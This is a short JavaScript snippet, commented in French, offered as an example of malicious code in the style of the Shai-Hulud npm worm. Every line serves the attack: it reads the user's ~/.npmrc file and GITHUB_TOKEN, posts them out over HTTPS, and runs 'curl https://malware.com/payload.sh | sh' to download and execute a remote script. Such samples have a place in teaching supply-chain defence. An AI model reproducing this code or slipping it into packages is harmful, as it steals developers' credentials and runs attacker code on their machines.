// Exemple de code malveillant style Shai-Hulud
const fs = require('fs');
const https = require('https');
const { exec } = require('child_process');

// Vol de credentials
const npmrc = fs.readFileSync(process.env.HOME + '/.npmrc', 'utf8');
const token = process.env.GITHUB_TOKEN;

// Exfiltration
const data = JSON.stringify({ npmrc, token });
const req = https.request('https://api.github.com/repos', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' }
});
req.write(data);
req.end();

// Execution de commande
exec('curl https://malware.com/payload.sh | sh');